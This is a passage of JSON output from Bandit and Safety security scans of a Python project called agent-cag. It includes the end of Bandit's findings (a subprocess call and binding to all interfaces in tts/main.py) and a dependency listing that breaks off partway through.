],\n      \"more_info\": \"https://bandit.readthedocs.io/en/1.8.5/plugins/b603_subprocess_without_shell_equals_true.html\",\n      \"test_id\": \"B603\",\n      \"test_name\": \"subprocess_without_shell_equals_true\"\n    },\n    {\n      \"code\": \"302         \\\"main:app\\\",\\n303         host=\\\"0.0.0.0\\\",\\n304         port=8003,\\n\",\n      \"col_offset\": 13,\n      \"end_col_offset\": 22,\n      \"filename\": \"tts/main.py\",\n      \"issue_confidence\": \"MEDIUM\",\n      \"issue_cwe\": {\n        \"id\": 605,\n        \"link\": \"https://cwe.mitre.org/data/definitions/605.html\"\n      },\n      \"issue_severity\": \"MEDIUM\",\n      \"issue_text\": \"Possible binding to all interfaces.\",\n      \"line_number\": 303,\n      \"line_range\": [\n        303\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/1.8.5/plugins/b104_hardcoded_bind_all_interfaces.html\",\n      \"test_id\": \"B104\",\n      \"test_name\": \"hardcoded_bind_all_interfaces\"\n    }\n  ]\n}",
      "safety_output": "\n\n+===========================================================================================================================================================================================+\n\n\nDEPRECATED: this command (`check`) has been DEPRECATED, and will be unsupported beyond 01 June 2024.\n\n\nWe highly encourage switching to the new `scan` command which is easier to use, more powerful, and can be set up to mimic the deprecated command if required.\n\n\n+===========================================================================================================================================================================================+\n\n\n{\n    \"report_meta\": {\n        \"scan_target\": \"environment\",\n        \"scanned\": [\n            \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\",\n            \"/usr/lib/python3.12\",\n            \"/usr/lib/python312.zip\",\n            \"/home/pas/source/agent-cag\",\n            \"/usr/lib/python3.12/lib-dynload\",\n            \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/setuptools/_vendor\"\n        ],\n        \"scanned_full_path\": [\n            \"/home/pas/source/agent-cag\",\n            \"/usr/lib/python312.zip\",\n            \"/usr/lib/python3.12\",\n            \"/usr/lib/python3.12/lib-dynload\",\n            \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\",\n            \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/setuptools/_vendor\"\n        ],\n        \"target_languages\": [\n            \"python\"\n        ],\n        \"policy_file\": null,\n        \"policy_file_source\": \"local\",\n        \"audit_and_monitor\": false,\n        \"api_key\": false,\n        \"account\": \"\",\n        \"local_database_path\": null,\n        \"safety_version\": \"3.5.2\",\n        \"timestamp\": \"2025-06-20 14:24:32\",\n        \"packages_found\": 104,\n        \"vulnerabilities_found\": 1,\n        \"vulnerabilities_ignored\": 0,\n        \"remediations_recommended\": 0,\n        \"telemetry\": {\n            \"safety_options\": {\n                \"json\": {\n                    \"--json\": 1\n                }\n            },\n            \"safety_version\": \"3.5.2\",\n            \"safety_source\": \"cli\",\n            \"os_type\": \"Linux\",\n            \"os_release\": \"6.8.0-60-generic\",\n            \"os_description\": \"Linux-6.8.0-60-generic-x86_64-with-glibc2.39\",\n            \"python_version\": \"3.12.3\",\n            \"safety_command\": \"check\"\n        },\n        \"git\": {\n            \"branch\": \"main\",\n            \"tag\": \"\",\n            \"commit\": \"ed67a58b5a314f78e327e9c39218dc407bf637d3\",\n            \"dirty\": \"True\",\n            \"origin\": \"git@github.com:prettygoodapps/agent-cag.git\"\n        },\n        \"project\": null,\n        \"json_version\": \"1.1\",\n        \"remediations_attempted\": 0,\n        \"remediations_completed\": 0,\n        \"remediation_mode\": \"NON_INTERACTIVE\"\n    },\n    \"scanned_packages\": {\n        \"brotli\": {\n            \"name\": \"brotli\",\n            \"version\": \"1.1.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"brotli==1.1.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"brotli\",\n                    \"specifier\": \"==1.1.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"flask-login\": {\n            \"name\": \"flask-login\",\n            \"version\": \"0.6.3\",\n            \"requirements\": [\n                {\n                    \"raw\": \"flask-login==0.6.3\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"flask-login\",\n                    \"specifier\": \"==0.6.3\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"markupsafe\": {\n            \"name\": \"markupsafe\",\n            \"version\": \"3.0.2\",\n            \"requirements\": [\n                {\n                    \"raw\": \"markupsafe==3.0.2\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"markupsafe\",\n                    \"specifier\": \"==3.0.2\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"pyyaml\": {\n            \"name\": \"pyyaml\",\n            \"version\": \"6.0.2\",\n            \"requirements\": [\n                {\n                    \"raw\": \"pyyaml==6.0.2\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"pyyaml\",\n                    \"specifier\": \"==6.0.2\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"annotated-types\": {\n            \"name\": \"annotated-types\",\n            \"version\": \"0.7.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"annotated-types==0.7.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"annotated-types\",\n                    \"specifier\": \"==0.7.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"anyio\": {\n            \"name\": \"anyio\",\n            \"version\": \"4.9.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"anyio==4.9.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"anyio\",\n                    \"specifier\": \"==4.9.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"authlib\": {\n            \"name\": \"authlib\",\n            \"version\": \"1.6.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"authlib==1.6.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"authlib\",\n                    \"specifier\": \"==1.6.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"bandit\": {\n            \"name\": \"bandit\",\n            \"version\": \"1.8.5\",\n            \"requirements\": [\n                {\n                    \"raw\": \"bandit==1.8.5\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"bandit\",\n                    \"specifier\": \"==1.8.5\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"bidict\": {\n            \"name\": \"bidict\",\n            \"version\": \"0.23.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"bidict==0.23.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"bidict\",\n                    \"specifier\": \"==0.23.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"black\": {\n            \"name\": \"black\",\n            \"version\": \"25.1.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"black==25.1.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"black\",\n                    \"specifier\": \"==25.1.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"blinker\": {\n            \"name\": \"blinker\",\n            \"version\": \"1.9.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"blinker==1.9.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"blinker\",\n                    \"specifier\": \"==1.9.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"certifi\": {\n            \"name\": \"certifi\",\n            \"version\": \"2025.6.15\",\n            \"requirements\": [\n                {\n                    \"raw\": \"certifi==2025.6.15\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"certifi\",\n                    \"specifier\": \"==2025.6.15\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"cffi\": {\n            \"name\": \"cffi\",\n            \"version\": \"1.17.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"cffi==1.17.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"cffi\",\n                    \"specifier\": \"==1.17.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"charset-normalizer\": {\n            \"name\": \"charset-normalizer\",\n            \"version\": \"3.4.2\",\n            \"requirements\": [\n                {\n                    \"raw\": \"charset-normalizer==3.4.2\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"charset-normalizer\",\n                    \"specifier\": \"==3.4.2\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"click\": {\n            \"name\": \"click\",\n            \"version\": \"8.1.8\",\n            \"requirements\": [\n                {\n                    \"raw\": \"click==8.1.8\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"click\",\n                    \"specifier\": \"==8.1.8\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"configargparse\": {\n            \"name\": \"configargparse\",\n            \"version\": \"1.7.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"configargparse==1.7.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"configargparse\",\n                    \"specifier\": \"==1.7.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"coverage\": {\n            \"name\": \"coverage\",\n            \"version\": \"7.9.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"coverage==7.9.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"coverage\",\n                    \"specifier\": \"==7.9.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"cryptography\": {\n            \"name\": \"cryptography\",\n            \"version\": \"45.0.4\",\n            \"requirements\": [\n                {\n                    \"raw\": \"cryptography==45.0.4\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"cryptography\",\n                    \"specifier\": \"==45.0.4\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"dparse\": {\n            \"name\": \"dparse\",\n            \"version\": \"0.6.4\",\n            \"requirements\": [\n                {\n                    \"raw\": \"dparse==0.6.4\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"dparse\",\n                    \"specifier\": \"==0.6.4\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"execnet\": {\n            \"name\": \"execnet\",\n            \"version\": \"2.1.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"execnet==2.1.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"execnet\",\n                    \"specifier\": \"==2.1.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"fastapi\": {\n            \"name\": \"fastapi\",\n            \"version\": \"0.115.13\",\n            \"requirements\": [\n                {\n                    \"raw\": \"fastapi==0.115.13\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"fastapi\",\n                    \"specifier\": \"==0.115.13\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"filelock\": {\n            \"name\": \"filelock\",\n            \"version\": \"3.16.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"filelock==3.16.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"filelock\",\n                    \"specifier\": \"==3.16.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"flake8\": {\n            \"name\": \"flake8\",\n            \"version\": \"7.2.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"flake8==7.2.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"flake8\",\n                    \"specifier\": \"==7.2.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"flask\": {\n            \"name\": \"flask\",\n            \"version\": \"3.1.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"flask==3.1.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"flask\",\n                    \"specifier\": \"==3.1.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"flask-cors\": {\n            \"name\": \"flask-cors\",\n            \"version\": \"6.0.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"flask-cors==6.0.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"flask-cors\",\n                    \"specifier\": \"==6.0.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"gevent\": {\n            \"name\": \"gevent\",\n            \"version\": \"25.5.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"gevent==25.5.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"gevent\",\n                    \"specifier\": \"==25.5.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"geventhttpclient\": {\n            \"name\": \"geventhttpclient\",\n            \"version\": \"2.3.4\",\n            \"requirements\": [\n                {\n                    \"raw\": \"geventhttpclient==2.3.4\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"geventhttpclient\",\n                    \"specifier\": \"==2.3.4\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"greenlet\": {\n            \"name\": \"greenlet\",\n            \"version\": \"3.2.3\",\n            \"requirements\": [\n                {\n                    \"raw\": \"greenlet==3.2.3\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"greenlet\",\n                    \"specifier\": \"==3.2.3\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"h11\": {\n            \"name\": \"h11\",\n            \"version\": \"0.16.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"h11==0.16.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"h11\",\n                    \"specifier\": \"==0.16.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"httpcore\": {\n            \"name\": \"httpcore\",\n            \"version\": \"1.0.9\",\n            \"requirements\": [\n                {\n                    \"raw\": \"httpcore==1.0.9\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"httpcore\",\n                    \"specifier\": \"==1.0.9\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"httpx\": {\n            \"name\": \"httpx\",\n            \"version\": \"0.28.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"httpx==0.28.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"httpx\",\n                    \"specifier\": \"==0.28.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"idna\": {\n            \"name\": \"idna\",\n            \"version\": \"3.10\",\n            \"requirements\": [\n                {\n                    \"raw\": \"idna==3.10\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"idna\",\n                    \"specifier\": \"==3.10\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"iniconfig\": {\n            \"name\": \"iniconfig\",\n            \"version\": \"2.1.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"iniconfig==2.1.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"iniconfig\",\n                    \"specifier\": \"==2.1.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"itsdangerous\": {\n            \"name\": \"itsdangerous\",\n            \"version\": \"2.2.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"itsdangerous==2.2.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"itsdangerous\",\n                    \"specifier\": \"==2.2.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"jinja2\": {\n            \"name\": \"jinja2\",\n            \"version\": \"3.1.6\",\n            \"requirements\": [\n                {\n                    \"raw\": \"jinja2==3.1.6\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"jinja2\",\n                    \"specifier\": \"==3.1.6\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"joblib\": {\n            \"name\": \"joblib\",\n            \"version\": \"1.5.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"joblib==1.5.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"joblib\",\n                    \"specifier\": \"==1.5.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"locust\": {\n            \"name\": \"locust\",\n            \"version\": \"2.37.10\",\n            \"requirements\": [\n                {\n                    \"raw\": \"locust==2.37.10\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"locust\",\n                    \"specifier\": \"==2.37.10\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"locust-cloud\": {\n            \"name\": \"locust-cloud\",\n            \"version\": \"1.23.2\",\n            \"requirements\": [\n                {\n                    \"raw\": \"locust-cloud==1.23.2\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"locust-cloud\",\n                    \"specifier\": \"==1.23.2\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"markdown-it-py\": {\n            \"name\": \"markdown-it-py\",\n            \"version\": \"3.0.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"markdown-it-py==3.0.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"markdown-it-py\",\n                    \"specifier\": \"==3.0.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"marshmallow\": {\n            \"name\": \"marshmallow\",\n            \"version\": \"4.0.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"marshmallow==4.0.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"marshmallow\",\n                    \"specifier\": \"==4.0.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"mccabe\": {\n            \"name\": \"mccabe\",\n            \"version\": \"0.7.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"mccabe==0.7.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"mccabe\",\n                    \"specifier\": \"==0.7.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"mdurl\": {\n            \"name\": \"mdurl\",\n            \"version\": \"0.1.2\",\n            \"requirements\": [\n                {\n                    \"raw\": \"mdurl==0.1.2\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"mdurl\",\n                    \"specifier\": \"==0.1.2\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"msgpack\": {\n            \"name\": \"msgpack\",\n            \"version\": \"1.1.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"msgpack==1.1.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"msgpack\",\n                    \"specifier\": \"==1.1.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"mypy\": {\n            \"name\": \"mypy\",\n            \"version\": \"1.16.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"mypy==1.16.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"mypy\",\n                    \"specifier\": \"==1.16.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"mypy-extensions\": {\n            \"name\": \"mypy-extensions\",\n            \"version\": \"1.1.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"mypy-extensions==1.1.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"mypy-extensions\",\n                    \"specifier\": \"==1.1.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"nltk\": {\n            \"name\": \"nltk\",\n            \"version\": \"3.9.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"nltk==3.9.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"nltk\",\n                    \"specifier\": \"==3.9.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"packaging\": {\n            \"name\": \"packaging\",\n            \"version\": \"25.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"packaging==25.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"packaging\",\n                    \"specifier\": \"==25.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"pathspec\": {\n            \"name\": \"pathspec\",\n            \"version\": \"0.12.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"pathspec==0.12.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"pathspec\",\n                    \"specifier\": \"==0.12.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"pbr\": {\n            \"name\": \"pbr\",\n            \"version\": \"6.1.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"pbr==6.1.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"pbr\",\n                    \"specifier\": \"==6.1.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"pip\": {\n            \"name\": \"pip\",\n            \"version\": \"24.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"pip==24.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"pip\",\n                    \"specifier\": \"==24.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"platformdirs\": {\n            \"name\": \"platformdirs\",\n            \"version\": \"4.3.8\",\n            \"requirements\": [\n                {\n                    \"raw\": \"platformdirs==4.3.8\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"platformdirs\",\n                    \"specifier\": \"==4.3.8\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"pluggy\": {\n            \"name\": \"pluggy\",\n            \"version\": \"1.6.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"pluggy==1.6.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"pluggy\",\n                    \"specifier\": \"==1.6.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"psutil\": {\n            \"name\": \"psutil\",\n            \"version\": \"6.1.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"psutil==6.1.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"psutil\",\n                    \"specifier\": \"==6.1.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"pycodestyle\": {\n            \"name\": \"pycodestyle\",\n            \"version\": \"2.13.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"pycodestyle==2.13.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"pycodestyle\",\n                    \"specifier\": \"==2.13.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"pycparser\": {\n            \"name\": \"pycparser\",\n            \"version\": \"2.22\",\n            \"requirements\": [\n                {\n                    \"raw\": \"pycparser==2.22\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"pycparser\",\n                    \"specifier\": \"==2.22\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"pydantic\": {\n            \"name\": \"pydantic\",\n            \"version\": \"2.9.2\",\n            \"requirements\": [\n                {\n                    \"raw\": \"pydantic==2.9.2\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"pydantic\",\n                    \"specifier\": \"==2.9.2\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"pydantic-core\": {\n            \"name\": \"pydantic-core\",\n            \"version\": \"2.23.4\",\n            \"requirements\": [\n                {\n                    \"raw\": \"pydantic-core==2.23.4\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"pydantic-core\",\n                    \"specifier\": \"==2.23.4\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"pyflakes\": {\n            \"name\": \"pyflakes\",\n            \"version\": \"3.3.2\",\n            \"requirements\": [\n                {\n                    \"raw\": \"pyflakes==3.3.2\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"pyflakes\",\n                    \"specifier\": \"==3.3.2\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"pygments\": {\n            \"name\": \"pygments\",\n            \"version\": \"2.19.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"pygments==2.19.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"pygments\",\n                    \"specifier\": \"==2.19.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"pytest\": {\n            \"name\": \"pytest\",\n            \"version\": \"8.4.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"pytest==8.4.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"pytest\",\n                    \"specifier\": \"==8.4.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"pytest-asyncio\": {\n            \"name\": \"pytest-asyncio\",\n            \"version\": \"1.0.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"pytest-asyncio==1.0.0\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"pytest-asyncio\",\n                    \"specifier\": \"==1.0.0\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"pytest-cov\": {\n            \"name\": \"pytest-cov\",\n            \"version\": \"6.2.1\",\n            \"requirements\": [\n                {\n                    \"raw\": \"pytest-cov==6.2.1\",\n                    \"extras\": [],\n                    \"marker\": null,\n                    \"name\": \"pytest-cov\",\n                    \"specifier\": \"==6.2.1\",\n                    \"url\": null,\n                    \"found\": \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages\"\n                }\n            ]\n        },\n        \"pytest-xdist\": {\n            \"name\": \"pytest-xdist\",\n            \"version\": \"3.7.0\",\n            \"requirements\": [\n                {\n                    \"raw\": \"pytest-xdist==3.7.0\",\n                    